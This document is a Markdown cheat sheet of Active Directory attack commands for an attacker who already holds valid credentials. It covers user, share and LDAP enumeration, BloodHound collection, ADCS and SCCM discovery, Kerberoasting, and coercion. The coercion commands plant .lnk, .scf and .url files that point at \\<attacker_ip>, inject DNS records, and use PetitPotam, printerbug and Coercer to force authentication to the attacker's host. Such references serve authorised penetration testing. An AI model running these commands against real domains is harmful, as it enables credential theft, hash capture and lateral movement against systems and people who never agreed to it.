# Valid Credentials (cleartext creds, nt hash, kerberos ticket)

## Classic Enumeration (users, shares, ACL, delegation, ...)

- Find all users >>> Username
  - `GetADUsers.py -all -dc-ip <dc_ip> <domain>/<username>`
  - `nxc smb <dc_ip> -u '<user>' -p '<password>' --users`
- Enumerate SMB share >>> Scroll shares
  - `nxc smb <ip_range> -u '<user>' -p '<password>' -M spider_plus`
  - `nxc smb <ip_range> -u '<user>' -p '<password>' --shares [--get-file \\<filename> <filename>] `
  - `manspider <ip_range> -c passw -e <file extensions> -d <domain> -u <user> -p <password>`
- Bloodhound Legacy >>> ACL || Delegation || Username
  - `bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all`
  - `rusthound -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -z`
  - `import-module sharphound.ps1;invoke-bloodhound -collectionmethod all -domain <domain>`
  - `sharphound.exe -c all -d <domain>`
- Bloodhound CE >>> ACL || Delegation || Username
  - `bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all`
  - `rusthound-ce -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -z --ldap-filter=(objectGuid=*)`
  - `sharphound.exe -c all -d <domain>`
  - `SOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bloodhound-output --autosplit --threshold 900`
- Enumerate Ldap >>> ACL || Delegation || Username
  - `ldeep ldap -u <users> -p '<password>' -d <domain> -s ldap://<dc_ip> all <backup_folder>`
  - `ldapdomaindump.py -u <user> -p <password> -o <dump_folder> ldap://<dc_ip>:389`
  - `ldapsearch-ad.py -l <dc_ip> -d <domain> -u <user> -p '<password>' -o <output.log> -t all`
- Enumerate DNS >>> New targets (low hanging fruit)
  - `adidnsdump -u <domain>\\<user> -p "<password>" --print-zones <dc_ip>`

## Enumerate ADCS >>> ADCS Exploitation
- `certify.exe find`
- `certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc_ip>`

## Enumerate SCCM >>> SCCM Exploitation
- `sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug`
- `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm`
- `SharpSCCM.exe local site-info`

## Scan Auto
- from BH result
  - `AD-miner -c -cf Report -u <neo4j_username> -p <neo4j_password>`
- `PingCastle.exe --healthcheck --server <domain>`
- `Import-Module .\adPEAS.ps1; Invoke-adPEAS -Domain '<domain>' -Server '<dc_fqdn>'`

## Kerberoasting >>> Hash TGS
- `MATCH (u:User) WHERE u.hasspn=true AND u.enabled = true AND NOT u.objectid ENDS WITH '-502' AND NOT COALESCE(u.gmsa, false) = true AND NOT COALESCE(u.msa, false) = true RETURN u`
- `GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>`
- `Rubeus.exe kerberoast`

## Coerce
- Drop file
  - .lnk
    - `nxc smb <dc_ip> -u '<user>' -p '<password>' -M slinky -o NAME=<filename> SERVER=<attacker_ip>`
  - .scf
    - `nxc smb <dc_ip> -u '<user>' -p '<password>' -M sucffy -o NAME=<filename> SERVER=<attacker_ip>`
  - .url
    - `[InternetShortcut]... IconFile=\\<attacker_ip>\%USERNAME%.icon`
  - Other files
    - `ntlm_theft.py -g all -s <your_ip> -f test`
- Webdav
  - Enable webclient
    - .searchConnector-ms
      - `nxc smb <dc_ip> -u '<user>' -p '<password>' -M drop-sc`
  - add attack computer in dns
    - `dnstool.py -u <domain>\<user> -p <pass> --record <attack_name> --action add --data <ip_attacker> <dc_ip>`
  - Launch coerce with <attacker_hostname>@80/x as target >>> HTTP Coerce
- RPC call >>> SMB NTLM Coerce
  - `printerbug.py <domain>/<username>:<password>@<printer_ip> <listener_ip>`
  - `petitpotam.py -d <domain> -u <user> -p <password> <listnerer_ip> <target_ip>`
  - `coercer.py -d <domain> -u <user> -p <password> -t <target> -l <attacker_ip>`
- Coerce kerberos >>> SMB Kerberos coerce
  - `dnstool.py -u "<domain>\<user>" -p '<password>' -d "<attacker_ip>" --action add "<dns_server_ip>" -r "<servername>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" --tcp`
    - `petitpotam.py -u '<user>' -p '<password>' -d <domain> '<servername>1UWh...' <target>`

## Intra ID Connect
- Find MSOL
  - `nxc ldap <dc_ip> -u '<user>' -p '<password>' -M get-desc-users |grep -i MSOL`

## Can Connect to a computer >>> Lateral move

## Exploit >>> know vulnerabilities